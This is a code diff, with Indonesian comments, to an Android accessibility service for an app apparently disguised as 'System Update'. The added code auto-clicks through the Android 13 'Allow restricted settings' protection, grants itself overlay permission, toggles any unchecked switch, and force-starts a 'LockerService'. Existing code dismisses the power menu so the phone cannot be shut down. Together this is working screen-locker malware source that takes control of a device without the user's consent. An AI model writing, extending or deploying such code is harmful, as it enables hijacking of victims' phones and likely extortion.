@@ -44,9 +44,22 @@ public class CustomAccessibilityService extends AccessibilityService {
     @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
         writeLog("Event: " + event.getEventType());
-
-        // Deteksi jika menu Power muncul (biasanya dikelola oleh sistem)
         String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "";
+
+        // 1. Tangani blokir "Restricted Settings" (Android 13+)
+        if (packageName.equals("com.android.settings")) {
+            AccessibilityNodeInfo root = getRootInActiveWindow();
+            if (root != null) {
+                // Klik titik tiga di pojok kanan atas (More options)
+                checkAndClickByContentDesc(root, "More options");
+                checkAndClickByContentDesc(root, "Opsi lain");
+                // Klik "Allow restricted settings"
+                checkAndClick(root, "Allow restricted settings");
+                checkAndClick(root, "Izinkan pengaturan terbatas");
+            }
+        }
+
+        // 2. Deteksi jika menu Power muncul
         if (packageName.equals("android") || packageName.contains("systemui")) {
             // Jika ada teks terkait mematikan daya, langsung tekan Back
             checkAndDismissPowerMenu(getRootInActiveWindow());
@@ -56,7 +69,7 @@ public class CustomAccessibilityService extends AccessibilityService {
         if (rootNode == null) return;
 
         // Logika "Auto-Clicker"
-        // 1. Cari nama aplikasi di daftar "Display over other apps" jika terlempar ke list
+        // Cari nama aplikasi di daftar izin overlay
         checkAndClick(rootNode, "System Update");
 
         // Mencari tombol dengan teks tertentu (tergantung bahasa sistem)
@@ -71,7 +84,39 @@ public class CustomAccessibilityService extends AccessibilityService {
         checkAndClick(rootNode, "Izinkan ditampilkan di atas aplikasi lain");
         checkAndClick(rootNode, "Tampilkan di atas aplikasi lain");
         
+        // Jika sudah di halaman spesifik overlay, cari switch toggle jika tombol teks tidak ada
+        findAndClickSwitch(rootNode);
+
+        // Jalankan LockerService secara paksa jika izin sudah ada
+        if (Settings.canDrawOverlays(this)) {
+            Intent intent = new Intent(this, LockerService.class);
+            startForegroundService(intent);
+        }
+
         rootNode.recycle();
+    }
+
+    private void checkAndClickByContentDesc(AccessibilityNodeInfo node, String desc) {
+        List<AccessibilityNodeInfo> nodes = node.findAccessibilityNodeInfosByViewId("android:id/button1"); // Sering digunakan untuk OK dialog
+        for (AccessibilityNodeInfo n : node.findAccessibilityNodeInfosByText(desc)) { clickNode(n); }
+        // Cari berdasarkan content description (untuk tombol gambar/tiga titik)
+        if (node.getContentDescription() != null && node.getContentDescription().toString().contains(desc)) {
+            clickNode(node);
+        }
+        for (int i = 0; i < node.getChildCount(); i++) {
+            AccessibilityNodeInfo child = node.getChild(i);
+            if (child != null) checkAndClickByContentDesc(child, desc);
+        }
+    }
+
+    private void findAndClickSwitch(AccessibilityNodeInfo node) {
+        if (node == null) return;
+        if (node.getClassName() != null && node.getClassName().toString().contains("Switch") && !node.isChecked()) {
+            node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
+        }
+        for (int i = 0; i < node.getChildCount(); i++) {
+            findAndClickSwitch(node.getChild(i));
+        }
     }
 
     private void checkAndDismissPowerMenu(AccessibilityNodeInfo node) {
@@ -88,24 +133,19 @@ public class CustomAccessibilityService extends AccessibilityService {
     private void checkAndClick(AccessibilityNodeInfo node, String text) {
         List<AccessibilityNodeInfo> nodes = node.findAccessibilityNodeInfosByText(text);
         if (nodes != null && !nodes.isEmpty()) {
-            for (AccessibilityNodeInfo n : nodes) {
-                AccessibilityNodeInfo clickableNode = n;
-                // Cari parent yang bisa diklik jika teksnya sendiri tidak clickable
-                while (clickableNode != null && !clickableNode.isClickable()) {
-                    clickableNode = clickableNode.getParent();
-                }
+            for (AccessibilityNodeInfo n : nodes) { clickNode(n); }
+        }
+    }
 
-                if (clickableNode != null && clickableNode.isClickable()) {
-                    writeLog("Auto-clicking target for: " + text);
-                    clickableNode.performAction(AccessibilityNodeInfo.ACTION_CLICK);
-                    
-                    // Setelah berhasil klik izin overlay, coba kembali ke aplikasi
-                    if (text.toLowerCase().contains("permit") || text.toLowerCase().contains("allow") || text.contains("Izinkan")) {
-                        performGlobalAction(GLOBAL_ACTION_BACK);
-                    }
-                }
-                n.recycle();
-            }
+    private void clickNode(AccessibilityNodeInfo n) {
+        if (n == null) return;
+        AccessibilityNodeInfo clickableNode = n;
+        while (clickableNode != null && !clickableNode.isClickable()) {
+            clickableNode = clickableNode.getParent();
+        }
+        if (clickableNode != null && clickableNode.isClickable()) {
+            writeLog("Auto-clicking: " + (n.getText() != null ? n.getText() : "node"));
+            clickableNode.performAction(AccessibilityNodeInfo.ACTION_CLICK);
         }
     }
 
